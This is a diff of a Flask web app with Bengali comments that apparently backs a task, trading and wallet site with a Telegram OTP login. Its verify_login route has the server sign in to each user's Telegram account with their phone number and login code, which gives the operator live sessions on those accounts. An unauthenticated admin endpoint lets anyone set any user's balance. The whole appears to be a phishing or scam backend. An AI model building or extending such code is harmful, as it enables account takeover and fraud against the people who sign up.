@@ -29,26 +29,34 @@ temp_clients = {}
 # --- ৩. সবকটি HTML পেজের কানেকশন (Routes) ---
 @app.route('/')
 @app.route('/login')
-def login(): return render_template('login.html')
+def login(): 
+    return render_template('login.html')
 
 @app.route('/dashboard')
-def dashboard(): return render_template('dashboard.html')
+def dashboard(): 
+    return render_template('dashboard.html')
 
 @app.route('/task')
-def task(): return render_template('task.html')
+def task(): 
+    return render_template('task.html')
 
 @app.route('/trading')
-def trading(): return render_template('treading.html') # আপনার ফাইলের বানান অনুযায়ী
+def trading(): 
+    # আপনার ফাইলের নাম 'treading.html' তাই সেটাই রাখা হলো
+    return render_template('treading.html') 
 
 @app.route('/account')
-def account(): return render_template('account.html')
+def account(): 
+    return render_template('account.html')
 
 @app.route('/wallet')
-def wallet(): return render_template('wallet.html')
+def wallet(): 
+    return render_template('wallet.html')
 
 # --- ৪. এডমিন প্যানেল ফাংশন ---
 @app.route('/admin')
-def admin_page(): return render_template('admin.html')
+def admin_page(): 
+    return render_template('admin.html')
 
 @app.route('/api/admin/users', methods=['GET'])
 def get_all_users():
@@ -58,8 +66,14 @@ def get_all_users():
 @app.route('/api/admin/update_balance', methods=['POST'])
 def update_balance():
     data = request.json
-    users_col.update_one({"telegram_id": int(data['uid'])}, {"$set": {"main_balance": float(data['balance'])}})
-    return jsonify({"status": "success"})
+    try:
+        users_col.update_one(
+            {"telegram_id": int(data['uid'])}, 
+            {"$set": {"main_balance": float(data['balance'])}}
+        )
+        return jsonify({"status": "success"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
 
 # --- ৫. টেলিগ্রাম ওটিপি ও লগইন সিস্টেম ---
 @app.route('/api/send_otp', methods=['POST'])
@@ -85,14 +99,24 @@ async def verify_login():
             client, h = temp_clients[phone]['client'], temp_clients[phone]['hash']
             user_tg = await client.sign_in(phone, code, phone_code_hash=h)
             
-            # ডাটাবেসে সেভ করা
-            user_data = {"telegram_id": user_tg.id, "phone": phone, "joined": datetime.now()}
+            user_data = {
+                "telegram_id": user_tg.id, 
+                "phone": phone, 
+                "name": f"{user_tg.first_name or ''} {user_tg.last_name or ''}",
+                "joined": datetime.now()
+            }
             users_col.update_one({"telegram_id": user_tg.id}, {"$set": user_data}, upsert=True)
             return jsonify({"success": True, "uid": user_tg.id})
+        return jsonify({"success": False, "message": "Session expired"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
-# --- ৬. পোর্ট বাইন্ডিং (Render Fix) ---
+# --- ৬. টেস্ট রুট (সার্ভার চেক করার জন্য) ---
+@app.route('/test')
+def test_server():
+    return "<h1>Server is Running Successfully!</h1>"
+
+# --- ৭. পোর্ট বাইন্ডিং (এটি সবসময় সব কোডের নিচে থাকবে) ---
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
